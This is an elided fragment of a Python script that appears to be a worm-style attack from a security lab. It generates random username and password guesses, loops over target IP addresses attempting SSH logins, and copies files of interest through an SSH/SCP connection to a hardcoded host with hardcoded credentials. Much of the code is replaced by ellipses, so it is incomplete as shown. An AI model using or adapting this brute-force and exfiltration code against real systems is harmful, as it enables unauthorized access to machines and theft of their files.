...
def get_new_usernames(how_many):
    if debug: return ['anuj']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = ['anuj'.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames
...
def get_new_passwds(how_many):
    ...
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ 'anuj'.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['192.168.188.130']  #changing here
    ...
    for passwd in passwds:
        ...
        for user in usernames:
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                files_of_interest_at_target = ['/home/anuj/Info_Sec/']
                try:
		    ...
		    func()
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        ssh.connect('192.168.188.130',port=22,username='anuj',password='anuj',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
